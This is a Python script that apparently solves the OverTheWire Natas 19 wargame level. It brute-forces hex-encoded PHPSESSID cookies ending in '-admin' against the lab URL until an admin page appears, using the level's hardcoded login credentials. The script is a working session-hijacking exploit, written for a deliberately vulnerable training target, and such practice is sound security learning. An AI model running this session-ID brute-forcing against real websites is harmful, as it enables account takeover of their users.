import requests
import re
import binascii
userName = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = 'http://natas19.natas.labs.overthewire.org/index.php'
regex = "You are an admin"
converter = {'0': '30', '1': '31', '2': '32', '3': '33', '4': '34', '5': '35', '6': '36', '7': '37', '8': '38', '9': '39'}
for i in range(641):
    if (i % 10 == 0):
        print(i)
    iString = str(i)
    s = ''
    for j in range(len(iString)):
        s += converter[iString[j]]
    cookie = {'PHPSESSID': s + '2d61646d696e'}
    response = requests.get(url, verify=False, auth=(userName, password), cookies=cookie)
    regexSearch = re.search(regex, response.text)
    if regexSearch is not None:
        print(response.text)
        break


"""for i in range(10):
    print(i)
    for j in range(10):
        for t in range(10):
            response = requests.get(url, verify=False, auth=(userName, password), cookies={cookie: '%s2d61646d696e' % (str(i + 30) + str(j + 30) + str(t + 30))})
            regexSearch = re.search(regex, response.text)
            if regexSearch is not None:
                print(response.text)
                break"""